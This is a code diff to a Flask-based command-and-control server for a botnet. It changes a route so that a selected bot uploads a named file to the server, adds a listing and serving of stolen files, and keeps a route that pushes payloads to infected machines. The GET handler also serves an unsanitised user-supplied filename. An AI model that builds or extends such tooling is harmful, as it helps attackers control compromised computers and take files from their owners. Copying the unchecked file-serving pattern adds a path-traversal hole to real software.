@@ -1,6 +1,6 @@
 import os
 import socket
-from flask import Flask, render_template, session, request, Response, stream_with_context
+from flask import Flask, render_template, session, request, Response, send_file, jsonify
 from flask import make_response
 from flask_socketio import SocketIO, emit
 from functools import wraps
@@ -18,7 +18,8 @@ except:
 
 HOST = 'localhost'
 PORT = 1708
-UPLOAD_FOLDER = 'static/uploads/'  # TODO
+UPLOAD_FOLDER = 'static/uploads/'
+DOWNLOAD_FOLDER = 'media/downloads/'
 
 # Set this variable to "threading", "eventlet" or "gevent" to test the
 # different async modes, or leave it set to None for the application to choose
@@ -60,24 +61,29 @@ def upload_file():
 
 @app.route('/downloader', methods=['GET','POST'])
 def download_file():
-    filename = None
+    '''
+    POST: make the client start sending file to server
+    GET:  get json list of all files currently on server
+          if query parameter "file" specified then instead download
+          that file from server
+    '''
     if request.method == 'POST':
         filename = request.form.get('file')
-    elif request.method == 'GET':
-        filename = request.args.get('file')
-    if filename:
         if 'bot' in request.cookies:
-            response = Response(stream_with_context(
-                botnet.startFileDownload(
-                    request.cookies.get('bot'),filename)))
-            response.headers["Content-Transfer-Encoding"] = "base64"
-            response.headers["Content-Type"] = "charset=utf-8;base64"
-            # Set the right header for the response
-            # to be downloaded, instead of just printed on the browser
-            response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
-            return response
+            botnet.startFileDownload(request.cookies.get('bot'), filename)
+            return "done"
         else:
             return "No bot selected", 404
+    elif request.method == 'GET':
+        if 'file' in request.args:
+            filename = request.args.get('file')
+            if os.path.exists(os.path.join(DOWNLOAD_FOLDER,filename)):
+                return send_file(filename)
+            else:
+                return "File not found", 404
+        else:
+            filestr = json.dumps(botnet.getDownloadFiles())
+            return Response(filestr, status=200, mimetype='application/json')
     else:
         return "No file selected", 404
 
@@ -88,7 +94,6 @@ def payload_launch():
     if request.method == 'POST' and 'payload' in request.form:
         payload_name = request.form.get('payload')
     if 'bot' in request.cookies:
-
         botnet.sendPayload(request.cookies.get('bot'), payload_name)
         return "done"
     else:
@@ -153,7 +158,7 @@ if __name__ == "__main__":
     TCPSOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     TCPSOCK.bind((HOST, PORT))
 
-    botnet = BotNet(socketio)
+    botnet = BotNet(socketio,downloadpath=DOWNLOAD_FOLDER)
     botserver = BotServer(TCPSOCK, botnet, socketio)
 
     botnet.start()
